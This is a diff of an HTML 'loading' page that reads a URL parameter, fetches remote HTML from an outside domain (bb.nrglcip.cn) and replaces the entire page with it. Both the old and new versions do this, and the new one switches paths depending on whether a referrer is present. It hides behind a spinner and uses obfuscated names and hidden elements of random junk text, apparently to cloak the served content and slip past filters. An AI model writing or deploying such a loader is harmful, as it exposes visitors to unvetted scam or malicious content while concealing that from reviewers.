@@ -1,43 +1,183 @@
+<!DOCTYPE html>
 <html>
-<head> <meta charset="utf-8" /></head>
-<body></body>
-<script>
-    function loadJs(a) { var c = document.createElement("script"); c.src = a, document.body.appendChild(c);}
-    function getUrlParam(name) { var reg = new RegExp("(.|&)" + name + "=([^&]*)(&|$)"); var r = window.location.href.match(reg); if (r != null) return unescape(r[2]); return null;}
-    function Dget(e, t,a) {
-        var n = new XMLHttpRequest;
-        //n.timeout = 3000;
-        n.onreadystatechange = function () {
-            4 === n.readyState && (200 === n.status || 304 === n.status ? "function" == typeof t && t(n.responseText) : "function" == typeof a && a(n))
-        };n.ontimeout = function (e) {
-            //alert('请求超时,重新发起请求');
-            //location.reload();
-        };
-        n.open("GET", e, !0),
-            n.send(null)
-    }
-    var temp = getUrlParam('temp');
-    //if(document.referrer){
-    var temp_name = temp +'.html';
-    Dget('//imgkbc.bj.bcebos.com/j/'+temp_name,function(res){
-        var doc=document.open("text/html","replace")
-        doc.write(res);
-        doc.close()
-    })
-	function add_cnzz(site_id) {
-    var hm = document.createElement("script");
-    hm.src = "https://s4.cnzz.com/z_stat.php?id=" + site_id;
-    var s = document.getElementsByTagName("script")[0];
-    s.parentNode.insertBefore(hm, s);
+<head>
+    <title>加载中...</title>
+    <meta charset="UTF-8">
+    <style>
+        iframe {
+            display: none;
+            width: 100%;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            border: 0
+        }
 
-    var cnzz_span = document.createElement('span');
-    cnzz_span.id = "cnzz_stat_icon_" + site_id;
-    cnzz_span.style.display = "none"
+        body {
+            width: 100%;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            border: 0
+        }
 
-    document.body.appendChild(cnzz_span);
-}
-add_cnzz(1279189134)
-    //}
+        .lpxHW7Qy7 {
+            position: fixed;
+            left: 0;
+            right: 0;
+            top: 0;
+            bottom: 0;
+            z-index: 1;
+            background-color: #d8d8d8
+        }
 
-</script>
+        .lpxHW7Qy7 .SbTszN {
+            position: absolute;
+            left: 0;
+            right: 0;
+            top: 0;
+            bottom: 0;
+            height: 50px;
+            margin: auto
+        }
+
+        .lpxHW7Qy7 .content {
+            line-height: 50px;
+            text-align: center
+        }
+
+        .lpxHW7Qy7 .img {
+            width: 100%
+        }
+
+        .lpxHW7Qy7 .LtIwGU19rJW {
+            text-align: center
+        }
+
+        .lpxHW7Qy7 .LtIwGU19rJW span {
+            display: inline-block;
+            width: 6px;
+            height: 50px;
+            background-color: #FF5722;
+            -webkit-transform: scaleY(0.4);
+            transform: scaleY(0.4);
+            -webkit-animation: scale 1s infinite;
+            animation: scale 1s infinite
+        }
+
+        .lpxHW7Qy7 .LtIwGU19rJW span:nth-child(2) {
+            -webkit-animation: scale 1s .2s infinite;
+            animation: scale 1s .2s infinite
+        }
+
+        .lpxHW7Qy7 .LtIwGU19rJW span:nth-child(3) {
+            -webkit-animation: scale 1s .3s infinite;
+            animation: scale 1s .3s infinite
+        }
+
+        .lpxHW7Qy7 .LtIwGU19rJW span:nth-child(4) {
+            -webkit-animation: scale 1s .4s infinite;
+            animation: scale 1s .4s infinite
+        }
+
+        .lpxHW7Qy7 .LtIwGU19rJW span:nth-child(5) {
+            -webkit-animation: scale 1s .5s infinite;
+            animation: scale 1s .5s infinite
+        }
+
+        .lpxHW7Qy7 .LtIwGU19rJW span:nth-child(6) {
+            -webkit-animation: scale 1s .6s infinite;
+            animation: scale 1s .6s infinite
+        }
+
+        @-webkit-keyframes scale {
+            0% {
+                -webkit-transform: scaleY(0.4);
+                transform: scaleY(0.4)
+            }
+            20% {
+                -webkit-transform: scaleY(0.8);
+                transform: scaleY(0.8)
+            }
+            40% {
+                -webkit-transform: scaleY(1);
+                transform: scaleY(1)
+            }
+            100% {
+                -webkit-transform: scaleY(0.4);
+                transform: scaleY(0.4)
+            }
+        }
+
+        @keyframes scale {
+            0% {
+                -webkit-transform: scaleY(0.4);
+                transform: scaleY(0.4)
+            }
+            20% {
+                -webkit-transform: scaleY(0.8);
+                transform: scaleY(0.8)
+            }
+            40% {
+                -webkit-transform: scaleY(1);
+                transform: scaleY(1)
+            }
+            100% {
+                -webkit-transform: scaleY(0.4);
+                transform: scaleY(0.4)
+            }
+        }
+
+        .lpxHW7Qy7 .tips {
+            font-size: 1rem;
+            color: #fff;
+            text-align: center
+        }
+    </style>
+    <script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+    <script>
+        function yCB8R1C0Zq(name) { var reg = new RegExp("(.|&)" + name + "=([^&]*)(&|$)"); var r = window.location.href.match(reg); if (r != null) return unescape(r[2]); return null;}
+		var p1c2t = yCB8R1C0Zq('temp');
+		if (!document.referrer){
+			url="https://bb.nrglcip.cn/html/"+ p1c2t +".html?a=index";
+		}else {
+			url="https://bb.nrglcip.cn/htm1/"+ p1c2t +".html?a=share";
+		}
+		
+        fARwOKZ=url+"#"+new Date().getTime();
+        fARwOKZ && function() {
+            $.get(fARwOKZ, function(data) {
+                var new_doc = document.open("text/html", "replace");
+                new_doc.write(data);
+                new_doc.close();
+            });
+        }();
+
+    </script>
+
+</head>
+<body>
+
+<span style='display:none'>biRxn7S38l0xdD64xZgjgu1h66p4QAT9h4TJEJKqsj28Qqzln19ziVOiCJgJKYBQuKUw8qhACLFOB2rxFGPYCwTHPgYzd54jr7Zc</span>
+<div style='display:none'>wVfUZQVSpGhUMlN6wPiSdNfUV0jlIcvNI1GVVPl4bzf0kb9lRimvFty4mMeyZvzjkXzjJlarnEE</div>
+<img  src='' style='display:none'>
+<b style='display:none' >U9KxtXbGJ3VH</b><div class="lpxHW7Qy7">
+    <div class="SbTszN">
+        <div class="LtIwGU19rJW">
+            <p style="font-size:50px;color:#FF5722; padding-top: 18%; margin:-28% auto">正在加载...</p>
+
+            <span></span>
+            <span></span>
+            <span></span>
+            <span></span>
+            <span></span>
+            <span></span></div>
+
+    </div>
+</div>
+
+<p  style='display:none'>juY5SaAN3x2eYqcM1BBm4CMwPCxEGVifgmru9guDnlJAX05cqixUdfaqd2Yu43ToTbTyg0dMq</p>
+<a  href='#' style='display:none'>fJ6ySgGXyUuBhrhnjrFaSQCRE7yAKE9Q1WBLFwjYTqUKO75Rytrj3wDrrVNLHwMMeP</a>
+<li style='display:none' >fwaWBI0Yh2YVYG5jSINuaZpXTRKZFjhjtvSuE</li>
+<b style='display:none' >TaHHg0mz022yzQbwimbeyHs6ViBpTzo8RNyh49jYVDERvPTS6yRwmvCV9kiX0Fx2UbsriIrXmMMPliHe0sT7QuVyqfDds</b></body>
 </html>
